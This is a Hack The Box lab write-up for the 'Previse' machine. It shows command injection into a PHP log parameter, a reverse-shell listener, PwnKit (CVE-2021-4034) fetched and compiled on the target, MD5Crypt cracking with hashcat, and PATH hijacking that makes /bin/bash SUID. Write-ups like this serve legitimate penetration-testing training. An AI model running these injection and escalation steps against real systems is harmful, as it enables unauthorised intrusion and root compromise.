---
layout: single
title: Previse - Hack The Box
excerpt: "Previse is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to `accounts.php` whilst unauthenticated which leads to abusing PHP 'exec()' function since user inputs are not sanitized allowing remote code execution against the target, after gaining a www-data shell privilege escalation starts with the retrieval and cracking of a custom MD5Crypt hash which consists of a unicode salt and once cracked allows users to gain SSH access to the target then abusing a sudo executable script which does not include absolute paths of the functions it utilises which allows users to perform PATH hijacking on the target to compromise the machine."
date: 2025-06-03
classes: wide
header:
  teaser: /img2/previse.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Web Enumeration
  - Execution After Redirect (EAR) Vulnerability - Skipping Redirects
  - PHP Source Code Analysis
  - Command Injection (RCE)
  - Information Leakage
  - Database Enumeration
  - Cracking Hashes
  - SUID Binary Exploitation [Privilege Escalation] (OPTION 1)
  - Abusing Sudoers Privilege + PATH Hijacking [Privilege Escalation] (OPTION 2)
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.104
```

![](/img2/Pasted%20image%2020250603093249.png)

- Dirsearch

```bash
dirsearch -u 10.10.11.104
```

![](/img2/Pasted%20image%2020250603100111.png)

- Intercept accounts.php request and check it

![](/img2/Pasted%20image%2020250603100247.png)

> Before redirection, we can do a request to accounts.php, so let's create a valid request with POST method.

## Exploitation

- Execution After Redirect (EAR) Vulnerability - Skipping Redirects

![](/img2/Pasted%20image%2020250603100445.png)

- Download backup zip

![](/img2/Pasted%20image%2020250603100646.png)

- Check php source code

![](/img2/Pasted%20image%2020250603112333.png)

> In logs.php we can try to inject command when python execute /opt/scripts/log_process.py.

```bash
/usr/bin/python /opt/scripts/log_process.py space;whoami
```

- RCE

![](/img2/Pasted%20image%2020250603112629.png)

```bash
tcpdump -i tun0 icmp
```

![](/img2/Pasted%20image%2020250603112831.png)

- Reverse shell

![](/img2/Pasted%20image%2020250603113153.png)

```bash
nc -nlvp 9000
```

## Post-exploitation (OPTION 1)

- Find sudoers 

```bash
find / -perm -4000 2>/dev/null
```

![](/img2/Pasted%20image%2020250603124208.png)

- CVE-2021-4034 (Pkexec Local Privilege Escalation)

```bash
wget https://github.com/ly4k/PwnKit/blob/main/PwnKit.c
python3 -m http.server
```

```bash
wget http://10.10.16.7/PwnKit.c
gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
./PwnKit
```

## Post-exploitation (OPTION 2)

- Connect to database with leaked credentials

![](/img2/Pasted%20image%2020250603114431.png)

> We can see the password and database inside config.php on backup folder

```bash
mysql -u root -p
```

- Crack MD5 hash

![](/img2/Pasted%20image%2020250603122541.png)

```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

![](/img2/Pasted%20image%2020250603122614.png)

- Connect to ssh

```bash
ssh m4lwhere@10.10.11.104
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250603122903.png)

- PATH Hijacking

```bash
cat /opt/scripts/access_backup.sh
```

![](/img2/Pasted%20image%2020250603123315.png)

```bash
cd /tmp && export PATH=/tmp/:$PATH && echo "chmod u+s /bin/bash" > gzip && chmod +x gzip && && sudo /opt/scripts/access_backup.sh
```

```bash
ls -l /bin/bash
```

![](/img2/Pasted%20image%2020250603123632.png)

```bash
bash -p
```


![](/img2/Pasted%20image%2020250603123055.png)